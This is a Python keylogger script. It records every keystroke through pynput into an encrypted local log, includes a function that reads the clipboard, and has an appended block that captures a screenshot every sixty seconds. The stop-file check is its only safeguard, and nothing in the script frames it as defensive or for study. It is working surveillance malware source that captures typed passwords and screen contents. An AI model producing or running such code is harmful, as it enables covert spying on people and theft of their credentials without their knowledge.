from pynput import keyboard
import pyperclip
from cryptography.fernet import Fernet
from datetime import datetime

# Generate or load encryption key
import os

key_file = "encryption_key.key"

stop_file = "stop.txt"

def should_stop():
    return os.path.exists(stop_file)

# Check if a key already exists
if os.path.exists(key_file):
    with open(key_file, "rb") as f:
        key = f.read()
else:
    key = Fernet.generate_key()
    with open(key_file, "wb") as f:
        f.write(key)

cipher = Fernet(key)

log_file = "keylog.txt"

def encrypt_log(text):
    return cipher.encrypt(text.encode()).decode()

def save_log(text):
    encrypted_text = encrypt_log(text)
    with open(log_file, "a") as f:
        f.write(f"{encrypted_text}\n")

def on_press(key):
    try:
        save_log(f"{key.char}")
    except AttributeError:
        save_log(f"[{key}]")

def on_release(key):
    if should_stop():
        print("Stop file detected. Exiting...")
        return False

def get_clipboard():
    try:
        return pyperclip.paste()
    except:
        return "Clipboard access error"

with open(log_file, "a") as f:
    f.write(f"\n--- Logging started at {datetime.now()} ---\n")

# Start keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()



from PIL import ImageGrab
import threading

def take_screenshot():
    img = ImageGrab.grab()
    img.save(f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")

    threading.Timer(60, take_screenshot).start()  # Capture every 60 sec

# Start taking screenshots
take_screenshot()
